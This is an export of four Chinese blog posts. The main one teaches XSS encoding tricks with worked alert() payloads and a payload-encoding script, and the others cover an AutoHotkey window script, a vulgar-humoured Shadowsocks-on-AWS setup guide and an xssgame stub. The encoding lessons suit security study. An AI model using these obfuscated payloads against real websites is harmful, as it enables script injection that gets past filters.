[{"title":"XSS 编码的一些基础知识","date":"2017-09-07T17:01:01.000Z","path":"2017/09/08/xss_charset/","text":"记得那天，Windows xp 桌面上的天很蓝。这是第几次远远的望着已经记不清了，走上前试试看吧。我表现的不是很熟络，交谈的过程却出奇的愉快，好感度的 Level 似乎在不经意间也升了几级。伴随着逐渐深入的交流，难免会擦出些共鸣的火花。我是个对待这种事情比较认真的人。了解的时候，走走心就好了。真到了认定了的时候，再走……走四方，路迢……可能那一天来的快了些，仓促间暴露出了还没准备好的胆怯。不知道有没有被看到，不过想想也却是没什么丢人的。说来也不怕笑话，平时会刻意让自己多留意一些有关体位的姿势。在得到“请开始你的表演”的暗示时，脑海中的各种体位交错在一起，心还不争气的砰砰跳个不停。这短暂的瞬间突然很慌张，毕竟没有实际操作的经验，这些体位有没有效果我心里也没底。我动起来的那一刻，我完全不知道下一秒会得到什么样的反应。毕竟是个没有经验的年轻人，当发现没有回应的时候，内心那个轻声呢喃的质疑声现在都还记得。有点慌张，还有些不知所措。不知从哪里涌出来的不甘让我顾不及反应如何就把脑中的体位一个接一个的用了出来。渐渐的有了回应，因某些姿势恰到好处弹出回应的 body 给了我一些信心。可有时任凭我姿势如何，那依然沉寂的如没有音乐的骨灰盒的 body，却成了挥不去的阴影。那天事后，我点了支烟。脑海中回忆着前一刻自己操作的慌张，眼神透过迷蒙的烟雾望着前方。我想通了一件事情。XSS 这样各种编码瞎特么插，迟早药丸。 前几天有人看了我前面的博客后问我「什么样的情况下使用什么编码方式?」当时我就扇了自己一嘴巴子，确实心路历程却是描述的不够饱满…… 正文之前编码这件事如果瞎j8操作那真是犹如「加藤老师扣人嘴」，还是写一写吧。便有了这篇。 其实该使用什么编码插入，要根据实际情况而定，单一的编码，混合编码都有可能。重要的是清楚哪种编码在哪个时刻被哪种规则解析。 简单点来说就是：URL 请求时会对百分号等 URL 的编码方式进行转码；浏览器接收到页面数据后，会对 HTML 实体编码进行转码；执行 JS 时会对 JSUnicode 等 JS 支持的方式进行转码。 复合编码的情况稍微复杂了些，比如这样：12345678910&lt;html&gt;&lt;body&gt; &lt;a href=\"javascript:ShowSomething('&amp;#37&amp;#53&amp;#99&amp;#37&amp;#55&amp;#56&amp;#37&amp;#51&amp;#52&amp;#37&amp;#51&amp;#49');\"&gt;click&lt;/a&gt;&lt;/body&gt;&lt;script&gt; function ShowSomething(x)&#123; alert(x); &#125;&lt;/script&gt;&lt;/html&gt; 这个例子中，从浏览器开始加载页面到你点击「click」弹出内容，ShowSomething() 的参数经过了三次转码。 如果看不懂上面的例子没关系，等看完这篇文章，你还是看不懂上面的例子，再跳楼也不迟：） 好进入正题前先说明（anli）一下：下文中不会刻意说明某些字符转码前后分别是什么，大家请自行对照。如果有转码需求，可以使用 Cos 他们这个开源工具 「xssor.io」 自行转码。 另外，本篇会面向基础薄弱的读者。会写的相对浅显，例如不会提及 DOM 、 JS 解释器 等这类需要一定知识积累的概念。老司机可以下车了～ URL 编码这里要说的 URL 编码指的是 URI 的百分号编码。我们在进行 URL 请求时，浏览器会自动帮我们把部分符号转换成 &#39;%&#39; + &#39;十六进制数字&#39; 的形式，用 windows 时间长的朋友们可能会遇见自己的安装软件时显示的路径中有一些字符或者中文会被显示为这种形式。 服务器接收到提交来的请求时，会先把 % 编码转换成正常的字符。我们借助一个简单的 php web 应用来说明这个问题，代码很简单：123456789&lt;html&gt;&lt;body&gt; &lt; a href=' \"URL 请 求：\" + location.search.substr(1) + \"\\n\" + \"服务器接受：\" + \"&lt;?php echo 'para='.$_GET['para']?&gt;\" );' &gt;click&lt;/ a&gt;&lt;/body&gt;&lt;/html&gt; 上面这段代码可以自己放到自己的服务器上试一下。当我们带着这样的参数请求时：1http://www.xxx.com/xxx.php?para=%3Cscript%3E%61lert();%3C/script%3E 从 alert() 的内容和 Chrome 的控制台都能看出我们的「百分号编码」被转义为正常内容了。其中 alert() 中的 a 被我转成了 %61，想说明除了符号，数字和字母也是可以做转换的。 URL 这里其实还有一种 Base64 编码, 常用来做简单加密传输数据。比如我们在 「xssor.io」 中使用 「Base64EN」转换下面的代码&lt;script&gt;alert(/xss/);&lt;/script&gt; 得到： PHNjcmlwdD5hbGVydCgveHNzLyk7PC9zY3JpcHQ+我们可以这样试试效果：1&lt;a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk7PC9zY3JpcHQ+\"&gt;XSS&lt;/a&gt; 点击链接后，就会通过 data 协议去加载后面的内容。其中，如果声明了 Base64 的话，就会做相应的 Base64 解码操作。对了，这个例子在 Chrome 里会被拦截，点击没反应的话，按 F12 你会看到红色的警告，控制台里点击一下链接就看到效果了。其实还有……这里就不讲了。想拓展的可以去 「xssor.io」看看上面都有什么，这也是一种学习方式：）。 HTML 实体编码有些时候，我们想在页面上显示的东西会跟 HTML 本身的标记冲突。比如我们只想在页面中显示 &lt;script&gt;alert();&lt;/script&gt; 而不是执行这串代码的时候，我们如下这样写是不行的：12345&lt;html&gt;&lt;body&gt; &lt;script&gt;alert();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 其中的 &lt;script&gt;alert();&lt;/script&gt; 会被当作 JS 脚本进行解析。但如果我们把这些字符用另一种方式表示，只要不出现类似 &lt;script&gt; 这种内容的话，问题似乎就解决了。HTML 编码就是用来解决这件事情的，我们的 ‘&lt;’ 字符可以用 HTML编码中的 &amp;lt; 来表示。那我们的代码可以变成：12345&lt;html&gt;&lt;body&gt; &amp;lt;scirpt&gt;alert();&amp;lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 上面的代码可以自己拷贝出来，保存到文本文件，起名 xxx.html 然后用浏览器打开试试看。上面用到的是 &#39;&amp;&#39; + &#39;约定名称&#39; + &#39;;&#39; 的形式，其实还有 &#39;&amp;#&#39; + &#39;十进制数字&#39; + &#39;;&#39; 和 &#39;&amp;#x&#39; + &#39;十六进制数字&#39; + &#39;;&#39; 的形式。比如上文的 &#39;&lt;&#39; 这个字符可以表示为 &amp;#0060; 和 &amp;#x003c;。其中约定名称是为了便于记忆，后面的十进制和十六进制编码中 # 后面的连续的零多几个或者少几个都可以，类似1和00001的数值是相等的感觉。 我们都知道这样是可以触发弹窗的（不知道的话，要自行补一补哦）：12345&lt;html&gt;&lt;body&gt; &lt;img src='' onerror='alert();'/&gt;&lt;/body&gt;&lt;/html&gt; 我们还可以应用 HTML 实体编码这样：12345&lt;html&gt;&lt;body&gt; &lt;img src='' onerror='&amp;#97;lert&amp;#40;&amp;#41;&amp;#59'/&gt;&lt;/body&gt;&lt;/html&gt; 但有个要求：HTML 实体编码不能干扰到标签自身的属性和声明性内容。比如：123456&lt;html&gt;&lt;body&gt; &lt;im&amp;#103; src='' onerror='alert();'/&gt; &lt;img sr&amp;#99;='' onerror='alert();'/&gt;&lt;/body&gt;&lt;/html&gt; 都是不行的。 关于 HTML 实体编码，十进制与十六进制编码后面的 ‘;’ 是可以省略的。 JS 编码到这里，可能大家面对各种编码已经比较淡定了，不就是不同的编码规则嘛。首先说说 JS Unicode 编码规则是 &#39;\\u&#39; + &#39;四位十六进制数字&#39; 不够四位前面补0。我们来看看例子（通过 「xssor.io」转码）：12345678910&lt;html&gt;&lt;body&gt;&lt;/body&gt;&lt;script&gt; //进行 JS Unicode 转码前的样子： //document.body.innerHTML=\"&lt;img src='' onerror='alert(/xss/)'/&gt;\"; document.body.innerHTML=\"\\u003c\\u0069\\u006d\\u0067\\u0020\\u0073\\u0072\\u0063\\u003d\\u0027\\u0027\\u0020\\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072\\u003d\\u0027\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u002f\\u0078\\u0073\\u0073\\u002f\\u0029\\u0027\\u002f\\u003e\";&lt;/script&gt;&lt;/html&gt; 这段代码在执行 innerHTML 操作前，因为字符串符合 Unicode 编码规则，会被先解码再输出。另外，也可以这样玩：123&lt;script&gt; \\u0061lert(/xss/);&lt;/script&gt; 好，下面说说 「8进制」和「16进制」的转义字符。「8进制」由 &#39;\\&#39; + &#39;8进制数字&#39; 组成。「16进制」由 &#39;\\x&#39; + &#39;16进制数字&#39; 组成。 我们来看看例子。 额……嗯……「xssor.io」上并没有直接提供这两种转码功能…… 在网上简单搜索了一下，没找到什么合适的。「卧槽，没有地方能转怎么办？」『自己写啊』 自己写一个「定制版转换工具」其实自己写的难度不大，为什么这么说？因为 「xssor.io」 已经实现了 10进制 与 16进制 的 encode、decode功能。嗯，我们去「借鉴一下」。 xssor 是开源项目，我们可以去 xssor [github] 「借鉴代码」。 通过项目的页面代码，我们能能够找到我们需要的代码所在位置： 我们到 github 上找到相应的方法，看具体实现： 作为一个老司机，最重要的还是「心中无码」，我们只要看它的实现思想就好。核心思想是通过 charCodeAt() 把我们输入的内容转成 Unicode 编码的数字，然后使用 toString(x) 再转成对应 x 进制的数字，然后定制我们的样式。下面来根据我们的需求，定制我们自己的代码：1234567891011121314151617181920&lt;html&gt;&lt;body&gt;&lt;/body&gt;&lt;script&gt; function xss_js_to8or16(x, txt)&#123; var _a=\"\"; for(i=0; i&lt;txt.length; i++)&#123; // 这里用到了三目运算符。如果不知道自行充能哦。 s = txt.charCodeAt(i).toString(x == 8 ? 8 : 16); // '\\\\' 转义后变为 '\\' _a += (x == 8 ? \"\\\\\" : \"\\\\x\") + s; &#125; return _a; &#125; var str = \"&lt;img src='' onerror='alert(/xss/)'/&gt;\"; console.log(xss_js_to8or16(8, str)); console.log(xss_js_to8or16(16, str));&lt;/script&gt;&lt;/html&gt; 好了，我们把代码保存为 xx.html ，并通过浏览器打开，F12 下看 Console 标签内的内容，就是我们想要的 8进制 与 16进制的内容了。 把拿到的字符串放入我们的例子中，8进制：12345678910&lt;html&gt;&lt;body&gt;&lt;/body&gt;&lt;script&gt; //进行 JS Unicode 转码前的样子： //document.body.innerHTML=\"&lt;img src='' onerror='alert(/xss/)'/&gt;\"; document.body.innerHTML=\"\\74\\151\\155\\147\\40\\163\\162\\143\\75\\47\\47\\40\\157\\156\\145\\162\\162\\157\\162\\75\\47\\141\\154\\145\\162\\164\\50\\57\\170\\163\\163\\57\\51\\47\\57\\76\";&lt;/script&gt;&lt;/html&gt; 16进制：12345678910&lt;html&gt;&lt;body&gt;&lt;/body&gt;&lt;script&gt; //进行 JS Unicode 转码前的样子： //document.body.innerHTML=\"&lt;img src='' onerror='alert(/xss/)'/&gt;\"; document.body.innerHTML=\"\\x3c\\x69\\x6d\\x67\\x20\\x73\\x72\\x63\\x3d\\x27\\x27\\x20\\x6f\\x6e\\x65\\x72\\x72\\x6f\\x72\\x3d\\x27\\x61\\x6c\\x65\\x72\\x74\\x28\\x2f\\x78\\x73\\x73\\x2f\\x29\\x27\\x2f\\x3e\";&lt;/script&gt;&lt;/html&gt; 如果你仔细观察下，会发现， JS 8进制编码的长度要短一些，如果遇到插入长度有所限制的情况就可以用到这个特点。还有一种叫做 JSFuck 的编码，长什么样呢？1[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])() 我们在 Chrome 的控制台中输入： 如果想详细了解浏览器、解释器之间到底是怎么配合的，可以看看这篇文章学习一下。How browsers work - Behind the scenes of modern web browsers 现在再来看看开头提到的混合编码：12345678910&lt;html&gt;&lt;body&gt; &lt;a href=\"javascript:ShowSomething('&amp;#37&amp;#53&amp;#99&amp;#37&amp;#55&amp;#56&amp;#37&amp;#51&amp;#52&amp;#37&amp;#51&amp;#49');\"&gt;click&lt;/a&gt;&lt;/body&gt;&lt;script&gt; function ShowSomething(x)&#123; alert(x); &#125;&lt;/script&gt;&lt;/html&gt; 页面加载时，会把 a 标签中的 HTML 实体编码做解码。当点击「click」时，先把 href 的内容当作整体做 URL 解码。最后因为 javascript 伪协议，把其中的 8进制转义字符做解码。至于每一步，由什么转成什么，就不用我说了吧：） 后记本篇的目的在于科普基础的编码，为了让非科班出身的朋友看起来不那么晦涩，理论知识介绍较少。但这不代表理论知识不重要，我的初衷是希望大家能把我的例子拿出来修修改改，尝试不同的可能。在摸索中遇到疑惑，然后自己解决困惑，渐渐积累起一定的概念后，会有想知道原理的冲动。相信这个时候，你积累的东西已经能让你阅读通顺了。写这篇文章的过程中，自己也查阅了很多的文章与维基百科，写了大量的测试代码来验证想法和探究原理，与老司机交流解惑。但最后只把其中比较直观的拿出来当作例子。后面再写写一些我了解到的姿势和一些需要搞清楚的原理性知识点也说不定（上面的那篇 How browsers work 中有此类知识点）。不过到时候你可能已经比我强了，记得带带我：）","tags":[{"name":"XSS","slug":"XSS","permalink":"http://ev1l.cn/tags/XSS/"}]},{"title":"把你的编辑器置顶吧 - AutoHotkey","date":"2017-09-01T06:04:33.000Z","path":"2017/09/01/Windows_window_on_top/","text":"日常编码时总会打开浏览器查查东西，再继续写代码。或者一边看着查出来的内容，一边对照着写自己的代码。 这个时候「码 - 浏览器搜索 - 对照着码」变成了一个经常出现的通用流程。 我们有几种方式来解决这件事情。 快捷键反复切换当前 window 页面如果是白底，编辑器恰好是黑底，那眼科欢迎你 非全屏下各占一半。 太硬性，不灵活，拉伸窗口步骤麻烦 双屏 能解决需求，但抱着笔记本跑的时候还是会碰到这个问题 编辑器窗口置顶 抱着这种需求，去网上搜索一番，发现了一个叫做 AutoHotkey 的工具。 它的功能不少，如果有一些定制化的需求自己编写脚本来搞定。比如我们这次的「窗口置顶」。脚本代码：12345678910111213;==================================================;** 快捷键 Win+ESC 使当前窗口置顶/取消置顶;==================================================#Esc::WinSet, AlwaysOnTop, toggle,AWinGetTitle, getTitle, AWinget, getTop,ExStyle,Aif (getTop &amp; 0x8) TrayTip 已置顶, 窗口标题: `n%getTitle%,10,1else TrayTip 取消置顶, 窗口标题:`n %getTitle%,10,1return 我们需要下载一个叫做 Auto Hotkey 的程序，然后将我们这个脚本保存为后缀为「.ahk」的文件后，在程序里指定一下这个脚本文件，生成一个 exe 可执行程序(base file 选项记得选择 Unicode 64-bit 不然乱码)，双击新生成的 exe 图标就可以了。 至于更多的玩法大家自己探索吧。","tags":[{"name":"工具","slug":"工具","permalink":"http://ev1l.cn/tags/工具/"}]},{"title":"「从入门到入狱系列」 - AWS+SS 0成本徒手翻墙","date":"2017-08-25T16:00:00.000Z","path":"2017/08/26/AWS_SS_Hello_World/","text":"开篇日常BB前几天写了个「从入门到入狱系列」的文章，介绍了 xssgame 的通关经验，心里美滋滋。 分享出来后，萌新 DaLao 们纷纷表示「这他妈根本打不开，看他妈的棒棒鸡」难道求学的欲望没有让你的内心躁动不安吗。话说这一切的起因，要从古老的「GFW(Great Firewall)」说起。那是一个…… 自！己！去！查！好，我们终于费劲笔墨终于把 GFW 讲完了，接下来我们说说：翻墙干嘛。自！己！去！…… 还是说两句吧，要被打。起初呢，是因为听说「w*w.s*x.c*m」「w*w.pr*nh*b.com」这些网站有一些「不可描述的东西」，后来呢，就出不来了…… 关于免费与付费的 vpn说来真是惭愧，人类始终对于繁衍后代有着执着且坚定的信念。「墙挡上了不让看？墙在哪呢？把墙扒了，我要看人儿！」萌新在日常生活中也会因为各种各样的原因接触到「翻墙」这个词汇，有点行动力的小伙伴可能会下载各种免费 vpn 软件来排解内心的寂寞。但是呢，免费 vpn 的坑实在是太多了，萌新还是记住一点，天下没有免费的早餐、午餐、晚餐还有夜宵。12345678910┓┏┓┏┓┃┛┗┛┗┛┃＼○／┓┏┓┏┓┃ / STOP┛┗┛┗┛┃ノ)┓┏┓┏┓┃ USE┛┗┛┗┛┃ ┓┏┓┏┓┃ FREE┛┗┛┗┛┃ ┓┏┓┏┓┃ VPN┃┃┃┃┃┃ 这是余弦 DaLao 曾经发过的很经典的一个……一个……这叫啥？算了，就那么个玩意。 那对萌新来讲，不使用「free vpn」应该换成哪些姿势呢。首先想到的可能是「付费 vpn」，付费的其实也一样有风险。我们使用 vpn 时是把网络请求发给一个中间人，中间人帮你去请求，请求完以后再把得到的回复发给你。这个过程中，你的风险成本是不随着「付费」和「免费」的转换而有所降低或上升的。只能说付费的可能收了钱会相对的良心一点，但是我们不能把良心当作理所应当，你觉得呢。 AWS+SS 的姿势前面说到付费与免费都会在服务商的胯下颤抖那我们就自己搭建一个自己的梯子啊～自己搭建服务时选择服务器要满足几个条件： 1.有一台属于我们自己的服务器。2.服务器要有「公网 ip」便于我们去访问服务器。3.服务器要能正常访问诸如「www.google.com」「w*w.s*x.c*m」「w*w.pr*nh*b.com」这些网站。4.最好不花钱～ 然后我们发现「亚马逊AWS(Amazon Web Services) 云服务」很适合我们: 1.给你一台属于你的服务器。2.给你分配一个「公网 ip」3.有很多海外服务器可供选择，海外服务器不受 GFW 的限制可以访问「不可描述的网站」。4.免费一年～ 当然，美中不足就是每个月15G的流量限制，超出要\u001d花钱 QAQ。 有了服务器以后呢，我们需要在上面跑一个24小时供你使用的翻墙程序「shadowsocks 服务端」。有了服务器上随时待命的程序以后，我们只需要在本地安装一个相应的客户端软件与服务端链接，然后就能顺利通过你自己的服务器访问「不可描述的网站」了。绿色环保无虫害，重点是除了你，没人知道你在看些奇怪的东西。 可能是最不正经的教程 注册其实呢，按照你的生物本能去注册就可以……这里需要准备一张信用卡，可能会收到「预授权」费用1美刀消费的提示，先别慌，去查查这个「预授权」的交易类型是什么意思让自己放个心。其中有一个身份认证环节，要填写手机号，会有电话打过来要你给出页面中的 pin 码，你可以在手机输入或者一个数字一个数字的读给他听(用英语)，听说好多输入的都有问题，那我这边建议读吧。如果出现点击「Call Me Now」按钮上方会提示你错误，让你联系他们的情况，就点进去提交 case，说明好自己的问题：下面选择 phone 或者 chat。客服人员会联系你，不论 phone 还是 chat 都是英语哦～听不懂的话不用慌，对付对付以后你的邮箱会收到邮件，点击链接进入以后发现这一步已经通过了。 顺利通过注册后，我们点击这个 EC2 进行创建。 接着如果出现如下情况，就等几个小时后再来试试，最多不超过24小时。 创建创建的时候呢注意左上角要选择推荐选择东京节点 为什么推荐东京呢，显然不应该是因为东京的各位老师才选择的，因为东京的节点在物理上离我们国家比较近，能为我们提供较低的延迟，这点在「ssh」（可以理解为远程对我们服务器发送指令进行操作的一种方式）我们的服务器时感受明显，我身边朋友是美国节点，「ssh」远程连接时，终端中打字延迟感明显，很难受。当然只是相对来说，比较推荐东京，其他节点也是可以选择的。 接下来就是中规中矩的创建流程了。 接下来选择 Amazon 的系统影像这里选择，Amazon Linux AMI、RedHat、Ubuntu都行。我这边选择的是Ubuntu。下面就是选择实例的类型了，也就是选择你的服务器型号，因为我们是抱着不花钱的打算来的，所以我们这里选择 「t2.micro」,注意一下它下面标着「符合条件的免费套餐」。 接下来的步骤暂时不需要配，我们直接点击右下角含有启动字样的蓝色按钮结束这个流程就好。 接着有一点需要注意一下，提示你创建秘钥对时，一定要下载下来保存好，多备份几个地方，没有这个东西，你就没办法连接你的服务器了。 接下来提示你正在启动，并提示你创建账单警告，点进去创建一下，凭借从小锻炼的阅读理解能力进行勾选. 再下一步就是连接我们服务器了，找到自己的实例如果没有启动的话点击启动，然后在上面右键连接我们的服务器。 连接操作官方文档很详细，可以根据你的系统型号进行选择这里不详细讲了，大家去看文档吧。链接文档 安装 shadowsocks接下来就不要自信一波了，老老实实的跟着步骤来吧，免得踩坑。下面的「#」代表是我写的注释，不用在终端中输入，不带「#」的就照着样子在终端中敲出来后按回车，然后等结果，如果报错了的话，可以先留言，等不及自己去查一波也是可以的～1234567891011# 获取root权限sudo -s# 更新apt-getapt-get update# 安装 python 的 包管理工具 pipapt-get install python-pip# 安装shadowsockspip install shadowsocks 创建 shadowsocks 的配置文件我们安装好以后需要自己创建一下我们的配置文件，启动的时候再指定这个配置文件就可以了。配置文件的位置可以自由选择，不过建议放在/etc/shadowsocks/下面,这个目录还没有，我们要创建一下。12# 创建 shadowsocks 目录mkdir /etc/shadowsocks 接下来我们把配置文件的内容写好。12# 创建并编辑我们的配置文件 vim /etc/shadowsocks/config.json 如果有没使用过vim的小伙伴不用担心。我们使用vim命令进入编辑模式以后，确定自己的键盘输入法为英文大小写切换为小写。按下i键，观察左下方是否出现INSERT字样，如果有，证明我们进入了编辑模式。接下来我们图省事的话可以把我下面(的代码)直接复制粘贴进去。粘贴的姿势有的是右键就可以粘贴，有的是右键菜单中有粘贴，大家自己研究，如果不行那就只能手动敲进去了。我写的注释记得要删掉哦。如果是手动敲进去，注意请保持自己的输入法维持在英文状态。写好以后按esc键，再按下:键，左下角出现:字样，然后输入wq,这两个字母分别对应保存和退出，然后回车就ok了。12345678910111213141516&#123;# 配置服务器 ip，这里填写 0.0.0.0&quot;server&quot;:&quot;0.0.0.0&quot;,# 配置端口号及各自的密码# 这里我用的多用户配置，大家也可以采用单用户配置# 端口号如果不懂可以选择跟我相同的，密码修改为自己想设置的密码就好&quot;port_password&quot;:&#123; &quot;20610&quot;:&quot;MII**********QEA&quot; &#125;,# 超时时间 这个不用修改&quot;timeout&quot;:300,# 加密算法&quot;method&quot;:&quot;aes-256-cfb&quot;,# true 或者 false 开启后能降低延迟&quot;fast_open&quot;:false&#125; 关于上面的 fast_open 感兴趣的可以来这里看TCP-Fast-Open 我们继续。 启动 shadowsocks123456# 启动ssserver -c /etc/shadowsocks/config.json -d start# 停止ssserver -c /etc/shadowsocks/config.json -d stop# 重新启动ssserver -c /etc/shadowsocks/config.json -d restart 我们这里使用启动命令启动一下试试。如果启动后不确定自己是否成功，可以使用1ps -aux | grep ssserver ps是 linux 查看系统进程的工具，感兴趣可以看看这个命令：ps命令如果像下图一样能查到相关结果，证明这个进程已经启动成功了。我们接下来把 shadowsocks 服务端进程设置为开机启动：1vim /etc/rc.local 按i进入Insert模式，在exit 0上面的空白行加入：1sudo ssserver -c /etc/shadowsocks/config.json -d start 然后esc接着:接着wq 然后我们可以去控制台右键我们的实例重启一下，再通过之前连接服务器的姿势连进去检查一下我们的ssserver进程是否在运行。 光配置了还不够，aws 还不允许正常访问我们刚刚配置的端口，我们回到 aws 的 web 控制台。配置好我们的出入站规则： 端口范围这里填上我们前面设置的端口，如果是多用户配置需要把设置的端口都添加进去。因为我配置的是多用户，所以端口就开放的我使用的端口，单用户直接开放对应端口就好。来源下拉框中选择“任何位置”。 到这里，我们服务器端的操作就结束了。 客户端客户端相对简单了很多来这里下载自己操作系统的客户端：shadowsocks 客户端下载好以后，配置一下，mac 和 windows 下大同小异，以 mac 的客户端作为讲解： 其中的地址填写的为 aws 控制台中 ipv4 字段中的 ip：端口号呢，就是你config.json文件中配置的端口号，密码也是你配置的密码，加密方式也选择配置文件中配置的那个。关于我们客户端的使用，平时用自动代理就好了，如果访问不了，就切全局，简单粗暴。为了防止流量超出或者此悲剧发生，需要设置账单警报。还有，到期前把你账户下所有AWS实例关闭并销毁，如果使用了 ebs， ebs 也要记得释放，都是辛酸泪… 好了，裤腰带解开这么半天，左手的纸巾准备好，音量自觉调低，我们准备出发～。本次列车途经 「www.google.com」「w*w.s*x.c*m」「w*w.pr*nh*b.com」还没有上车的旅客请抓紧时间上车。","tags":[{"name":"从入门到入狱","slug":"从入门到入狱","permalink":"http://ev1l.cn/tags/从入门到入狱/"},{"name":"工具","slug":"工具","permalink":"http://ev1l.cn/tags/工具/"}]},{"title":"「从入门到入狱系列」 - xssgame 通关经验(草稿)","date":"2017-08-02T16:00:00.000Z","path":"2017/08/03/Google_xssgame/","text":"此链接只能墙外围观享用 主站：www.xssgame.com 